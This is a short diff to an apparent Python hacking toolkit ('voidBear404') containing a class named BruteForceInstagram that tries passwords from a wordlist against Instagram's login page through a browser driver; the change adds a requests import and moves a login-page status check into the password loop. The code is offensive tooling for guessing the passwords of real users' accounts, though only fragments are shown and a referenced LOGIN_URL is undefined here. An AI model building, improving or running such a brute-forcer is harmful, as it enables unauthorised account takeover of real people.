@@ -1,6 +1,7 @@
 ##voidBear404## TOOLKIT
 import threading
 import queue
+import requests
 import time
 import os
 import sys
@@ -36,7 +37,7 @@ BANNER = f"""
 class BruteForceInstagram:
     def __init__(self):
         self.target_url = "https://www.instagram.com/accounts/login/"
-        STATUS = requests.get(LOGIN_URL).status_code
+        
         self.username = ""
         self.password_file = ""
         self.passwords = []
@@ -192,6 +193,7 @@ class BruteForceInstagram:
                     self.tested_count += 1
 
                 success = self.try_password(driver, password)
+                STATUS = requests.get(LOGIN_URL).status_code
 
                 if success:
                     with self.lock:
